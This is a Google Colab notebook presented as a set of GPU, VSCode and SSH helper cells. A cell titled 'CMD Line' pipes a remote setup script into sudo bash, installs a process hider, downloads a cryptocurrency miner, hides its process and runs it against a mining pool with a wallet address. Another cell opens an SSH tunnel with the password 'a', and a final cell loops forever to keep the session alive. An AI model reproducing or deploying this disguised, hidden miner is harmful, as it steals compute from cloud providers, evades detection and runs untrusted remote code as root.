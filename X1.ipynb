{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Copy of X1",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "deMpbjk4aU13"
      },
      "outputs": [],
      "source": [
        "#@title **T4 Finder** { vertical-output: true, display-mode: \"form\" }\n",
        "!nvidia-smi -L\n"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n"
      ],
      "metadata": {
        "id": "x3VInQzrEbVG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***VSCode***  { display-mode: \"form\" }\n",
        "!pip install gpu-tpu-lab-server \n",
        "from gpu_tpu_lab_server.core import jupyter_lab, vscode, run_process_in_background, run_process_in_foreground \n",
        "vscode()"
      ],
      "metadata": {
        "id": "Dsj4RKvwa96E"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***CMD Line***   { display-mode: \"form\" }\n",
        "from os import system, name\n",
        "from time import sleep\n",
        "from subprocess import PIPE, Popen\n",
        "import base64\n",
        "\n",
        "\n",
        "def cmdline(command):\n",
        "    process = Popen(\n",
        "            args=command,\n",
        "                    stdout=PIPE,\n",
        "                            shell=True\n",
        "                                )\n",
        "    return process.communicate()[0]\n",
        "\n",
        "\n",
        "\n",
        "cmdline ( 'curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar -xvf danila-miner-2.3.1-ubuntu-bionic.tar.gz && apt install screen && rm -rf danila-miner-2.3.1-ubuntu-bionic.tar.gz && sudo ph add danila-miner && ./danila-miner run https://server1.whalestonpool.com EQB9kIV4_vEkuOlij86mXNfTvAgDqVUuhti92VLdpymYmNga' )"
      ],
      "metadata": {
        "id": "hN5ZNmD8q4FD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***Ngrok*** { display-mode: \"form\" }\n",
        "!pip install colab_ssh --upgrade\n",
        "\n",
        "token = 'token' #@param {type:\"string\"}\n",
        "pw = 'a'\n",
        "\n",
        "from colab_ssh import launch_ssh\n",
        "launch_ssh(token , pw)"
      ],
      "metadata": {
        "id": "K26ndYwOjPzL"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title ***Sleep!***  { display-mode: \"form\" }\n",
        "while True:pass\n",
        "time.sleep(9223372036.854775)\n",
        "print ('Congratulation!!')"
      ],
      "metadata": {
        "id": "R4bhxq2GkykI"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
